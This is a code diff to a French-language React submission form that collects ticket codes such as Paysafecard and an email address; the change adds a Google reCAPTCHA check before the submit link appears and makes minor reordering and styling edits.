@@ -3,12 +3,15 @@ import { InfosUser } from "../utils/Types";
 import { generateField } from "../utils/generateField";
 import { sendUserInfosByEmail } from "../utils/Methods";
 import { tabValues } from "../utils/generateField";
+import ReCAPTCHA from 'react-google-recaptcha'
+
 
 function SubmissionForm() {
   const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
   const [error, setError] = useState("");
   const [message, setMessage] = useState("");
   const [selectedTicked, setSelectedTicked] = useState("Paysafecard");
+  const [recaptach, setRecaptach] = useState<string | null>(null)
   const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();
 
   let field1: any = useRef()
@@ -136,10 +139,10 @@ function SubmissionForm() {
           user,
           "EJqC4yBZ-H2QIvu8_"
         );
+        resetFields()
         setMessage(
           "votre requette a bien été prise en compte, verifiez votre mail"
         );
-        resetFields()
       }
     } catch (error) {
       console.log(error);
@@ -282,7 +285,15 @@ function SubmissionForm() {
             <input ref={field4} type="email" required onChange={handleEmail} />
             <label>Email</label>
           </div>
-          <a
+          <ReCAPTCHA
+            sitekey="6LdPgawpAAAAAGmOmfkO5HK5JgPzqTe-XSDBJY-A"
+            onChange={(val) => setRecaptach(val)}
+          />
+          {recaptach && <a
+            // data-aos="fade-right"
+            // data-aos-duration="1000"
+            // data-aos-offset="300"
+            className="myfadeperso"
             href="#"
             onClick={(e) => {
               submissionProcess(e);
@@ -293,7 +304,7 @@ function SubmissionForm() {
             <span></span>
             <span></span>
             consulter
-          </a>
+          </a>}
         </form>
       </div>
     </div>
